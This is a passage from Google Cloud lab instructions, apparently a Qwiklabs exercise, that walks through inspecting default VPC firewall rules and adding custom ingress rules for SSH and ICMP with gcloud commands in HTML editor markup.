style="padding-right: 0.1px;">gcloud compute instances create privatenet-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-c  --subnet=privatesubnet</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create VPC networks and instances</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-investigate-the-default-network-2'><span>Task 2. Investigate the default network</span></h4><p><span>In this task, you explore the default network and verify that the default-allow-ssh firewall rule is working. Later, you delete the default-vm-1 instance and default network because you no longer need it.</span></p><p><span>Return to the Cloud Console and view the firewall rules.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span></p></li></ol><p><span>The following four default rules are created for the default network:</span></p><p><img src="images/%2B3rX%2BBQoV4F%2Fs0b%2BSi9SndCb%2BjMo60W8vKASrh9dXL4%3D.png" referrerpolicy="no-referrer" alt="Four default firewall ingress rules"></p><p><span>Remember, all networks also have the following 2 rules, which are not displayed in the console:</span></p><p><img src="images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png" referrerpolicy="no-referrer" alt="Default deny all ingress and default deny all egress rules"></p><p><span>To check that the default-allow-ssh firewall rule is working, ssh into the default-vm-1 instance in the default network and test it.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span> to display a list of VM instances.</span></p></li><li><p><span>In the row for the </span><strong><span>default-vm-1</span></strong><span> instance, click </span><strong><span>SSH</span></strong><span>.</span></p></li></ol><p><span>You should connect successfully via SSH to the instance because of the default-allow-ssh rule. You can ping </span><code>www.google.com</code><span> to test the egress connectivity. Press </span><strong><span>Ctrl+C</span></strong><span> to stop the ping.</span></p><h5 id='delete-the-default-vm-1-instance-2'><span>Delete the default-vm-1 instance</span></h5><p><span>Now delete the default-vm-1 instance because you no longer need it.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>, select the </span><strong><span>default-vm-1</span></strong><span> instance and then click </span><strong><span>Delete</span></strong><span>.</span></p></li><li><p><span>In the confirmation box, click </span><strong><span>Delete</span></strong><span>.</span></p></li></ol><h5 id='delete-the-default-network-2'><span>Delete the default network</span></h5><p><strong><span>Note:</span></strong><span> Because the default network allows relatively open access, we recommend that you delete it for production projects.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; VPC networks</span></strong><span> to display the list of VPC networks in the Cloud Console.</span></p></li><li><p><span>Click the </span><strong><span>default</span></strong><span> network to view the network details.</span></p></li><li><p><span>Click </span><strong><span>Delete VPC Network</span></strong><span>.</span></p></li><li><p><span>In the confirmation box, click </span><strong><span>Delete</span></strong><span>.</span></p></li><li><p><span>Wait for the network to be deleted and verify that the default network is no longer displayed on the VPC Networks page.</span></p></li></ol><h4 id='task-3-investigate-the-user-created-networks-2'><span>Task 3. Investigate the user-created networks</span></h4><p><span>In this task, you explore the user-created networks to verify no ingress is allowed without custom firewall rules.</span></p><h5 id='verify-that-no-ingress-is-allowed-without-custom-firewall-rules-2'><span>Verify that no ingress is allowed without custom firewall rules</span></h5><p><span>Remember, all networks have the following 2 rules (which will not be displayed in the Console) to block all incoming traffic and allow all outgoing traffic. Unlike the default network, user-created networks do not have any other rules by default, so currently no inbound traffic is allowed.</span></p><p><img src="images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png" referrerpolicy="no-referrer" alt="Default deny all ingress and default deny all egress rules"></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span> to display a list of VM instances.</span></p></li><li><p><span>In the row for </span><strong><span>mynet-vm-1</span></strong><span> or </span><strong><span>mynet-vm-2</span></strong><span>, click </span><strong><span>SSH</span></strong><span>.</span></p></li></ol><p><span>You should </span><strong><span>NOT</span></strong><span> be able to connect via SSH to the instances.</span></p><p><span>You will now try to SSH into an instance from the Cloud Shell.</span></p><ol start='' ><li><p><span>Switch back to or reopen Cloud Shell.</span></p></li><li><p><span>To try to ssh into the </span><strong><span>mynet-vm-2</span></strong><span> instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>If prompted, type </span><code>Y</code><span> and press </span><strong><span>Enter</span></strong><span> twice to proceed.</span></p><p><span>We should </span><strong><span>NOT</span></strong><span> be able to connect via SSH to the instances. There is currently no inbound access allowed. Igonre the error message </span><strong><span>ERROR: (gcloud.compute.ssh) [/usr/bin/ssh] exited with return code [255]</span></strong></p><h4 id='task-4-create-custom-ingress-firewall-rules-2'><span>Task 4. Create custom ingress firewall rules</span></h4><p><span>In this task, you use Cloud Shell as your client host to test SSH connectivity to the instances. The external IP address of the Cloud Shell instance can be easily retrieved.</span></p><p><span>However, the IP address of your Cloud Shell instance can change if you close and reopen it, or if it is recycled due to inactivity. This should not be a problem during this lab. For a &quot;real&quot; project, you would allow the IP address of your SSH client host and there should not be a problem.</span></p><p><strong><span>Note:</span></strong><span> As you just verified, the browser-based console SSH feature used to connect to VM instances does not currently work. If you want to allow that, you need a firewall rule that allows the source IP address. However, source IP addresses for browser-based SSH sessions are dynamically allocated by the Cloud Console and can vary from session to session.</span></p><p>&nbsp;</p><p><span>For the feature to work, you must allow connections either from any IP address, or from Google&#39;s IP address range, which you can retrieve using public SPF records. Either of these options may pose unacceptable risks, depending on your requirements. Instead, you would allow the IP address of the SSH clients you are using to connect.</span></p><h5 id='allow-ssh-access-from-cloud-shell-2'><span>Allow SSH access from Cloud Shell</span></h5><ol start='' ><li><p><span>Switch back to or reopen Cloud Shell.</span></p></li><li><p><span>To retrieve the external IP address of the Cloud Shell instance, run the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ip=$(curl -s https://api.ipify.org)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "My External IP address is: $ip"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Sample output</span></strong><span> (your IP will be different):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">My External IP address is: 35.229.72.135</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>To add a firewall rule that allows port 22 (SSH) traffic from the Cloud Shell IP address, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-allow-ssh-from-cs \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network mynetwork --action ALLOW --direction INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules tcp:22 --source-ranges $ip --target-tags=lab-ssh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><p><span>This firewall rule is also given a target tag of </span><em><span>lab-ssh</span></em><span>, which means it applies only to instances that are tagged with the lab-ssh tag.</span></p><ol start='' ><li><p><span>To view the firewall rule in the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span></p></li></ol><p><span>It will look similar to the following, but your IP address will be different:</span></p><p><img src="https://cdn.qwiklabs.com/9uKhUJ%2FQAhtDY%2B5b5FXwBXuOImH%2F38MeUcSK7O6MzEk%3D" referrerpolicy="no-referrer" alt="Configuration for ingress lab-ssh firewall"></p><p><span>This firewall rule will be applied only to instances tagged with </span><em><span>lab-ssh</span></em><span>. It is currently not being applied to any instances.</span></p><p><strong><span>Note:</span></strong><span> You have just created and applied a firewall rule using a tag. One issue with tags is that they must be added to instances and could possibly be added or removed inadvertently. Firewall rules can also be applied to instances by the service account used. These rules will be applied automatically to all instances that use the specified service account.</span></p><ol start='' ><li><p><span>To add the lab-ssh network tag to the </span><strong><span>mynet-vm-2</span></strong><span> and </span><strong><span>mynet-vm-1</span></strong><span> instances, run the following commands in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags mynet-vm-2 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone us-central1-f \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --tags lab-ssh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags mynet-vm-1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone us-east4-a \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --tags lab-ssh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p>&nbsp;</p><h5 id='stateful-firewalls-2'><span>Stateful firewalls</span></h5><p><span>In VPC networks, firewall rules are stateful. So for each initiated connection tracked by allow rules in one direction, the return traffic is automatically allowed, regardless of any rules.</span></p><ol start='' ><li><p><span>To ssh into the </span><strong><span>mynet-vm-2</span></strong><span> instance, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.</span></p><ol start='' ><li><p><span>Type </span><code>exit</code><span> to log off the </span><strong><span>mynet-vm-2</span></strong><span> instance.</span></p></li><li><p><span>To ssh into the </span><strong><span>mynet-vm-1</span></strong><span> instance, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This connection should also succeed because the </span><strong><span>mynet-vm-1</span></strong><span> instance is in the same network, and the firewall rule you created is allowing access to all instances.</span></p><h5 id='allow-all-instances-on-the-same-network-to-communicate-via-ping-2'><span>Allow all instances on the same network to communicate via ping</span></h5><ol start='' ><li><p><span>While still logged in to the </span><strong><span>mynet-vm-1</span></strong><span> instance, try pinging the </span><strong><span>mynet-vm-2</span></strong><span> instance with the command shown below. (Replace the </span><em><span>[PROJECT_ID]</span></em><span> with the PROJECT_ID for your lab exercise.)</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The ping command will not succeed. Even though the </span><strong><span>mynet-vm-1</span></strong><span> and the </span><strong><span>mynet-vm-2</span></strong><span> instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping if needed. Do not log out of the </span><strong><span>mynet-vm-1</span></strong><span> instance yet.</span></p></li><li><p><span>To open a new Cloud Shell window, click </span><strong><span>Open a new tab</span></strong><span> (</span><strong><span>+</span></strong><span>).</span></p></li><li><p><span>To add a firewall rule that allows ALL instances in the mynetwork VPC to ping each other, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-allow-icmp-internal --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action ALLOW --direction INGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges 10.128.0.0/9</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.</span></p><ol start='' ><li><p><span>Switch back to the first Cloud Shell session that is connected to </span><strong><span>mynet-vm-1</span></strong><span> and run the ping again. This time it should work.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the hostname </span><em><span>mynet-vm-2</span></em><span> resolved to the internal IP address of the instance. The internal IP will start with </span><em><span>10.132.0</span></em><span> (for example, </span><em><span>10.132.0.2</span></em><span>). Google Cloud resolves internal hostnames for you.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>You can also try pinging the internal IP address directly and that will also work. Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>To locate the external IP address of </span><strong><span>mynet-vm-2</span></strong><span>, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>mynet-vm-2</span></strong><span>, locate and copy the external IP address of the instance.</span></p></li><li><p><span>From the Cloud Shell session that is connected to </span><strong><span>mynet-vm-1</span></strong><span>, try to ping the external IP address of the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div 